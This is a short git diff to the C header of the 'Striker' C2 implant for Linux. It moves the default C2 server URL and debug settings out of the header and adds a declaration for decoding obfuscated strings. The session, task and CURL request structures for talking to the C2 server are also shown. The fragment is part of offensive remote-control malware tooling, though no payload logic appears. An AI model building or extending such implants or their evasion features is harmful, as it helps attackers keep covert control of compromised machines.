@@ -1,8 +1,9 @@
 /**
- *--------------------------------------------------
+ *----------------------------------------------------
  * Header file for the Striker C2 implant for linux.
- *                                Author: Umar Abdul
- *--------------------------------------------------
+ * This should be included ONLY by the striker.c file.
+ *                                  Author: Umar Abdul
+ *----------------------------------------------------
  */
 
 #ifndef STRIKER_H
@@ -15,14 +16,6 @@
 #include <curl/curl.h>
 #include "striker_utils.h"
 #include "cJSON.h"
-
-// Set to non-zero value for debug outputs.
-#define STRIKER_DEBUG 1
-// The default URL. This is what the patcher will look for.
-#define URL_SIZE (sizeof(char) * 512)
-char baseURL[URL_SIZE] = "http://localhost:3000";
-// Max task result size in bytes
-#define MAX_RES_SIZE (sizeof(char) * 102400)
 
 /**
  * A struct for tracking session info.
@@ -52,6 +45,9 @@ typedef struct{
   unsigned short completed;
   cJSON *result;
 } task;
+
+// For decoding obfuscated strings.
+char *obfs_decode(char *str);
 
 /**
  * Initializes a new CURL object for a request to `path` relative to the base URL of the C2 server.
